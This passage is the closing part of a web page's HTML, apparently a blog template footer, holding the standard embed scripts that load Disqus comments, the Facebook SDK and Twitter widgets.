      dsq.src = 'http://' + disqus_shortname + '.disqus.com/' + disqus_script;
      (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
    }());
</script>



<div id="fb-root"></div>
<script>(function(d, s, id) {
  var js, fjs = d.getElementsByTagName(s)[0];
  if (d.getElementById(id)) {return;}
  js = d.createElement(s); js.id = id;
  js.src = "//connect.facebook.net/en_US/all.js#appId=212934732101925&xfbml=1";
  fjs.parentNode.insertBefore(js, fjs);
}(document, 'script', 'facebook-jssdk'));</script>





  <script type="text/javascript">
    (function(){
      var twitterWidgets = document.createElement('script');
      twitterWidgets.type = 'text/javascript';
      twitterWidgets.async = true;
      twitterWidgets.src = 'http://platform.twitter.com/widgets.js';
      document.getElementsByTagName('head')[0].appendChild(twitterWidgets);
    })();
  </script>





</body>
</html>
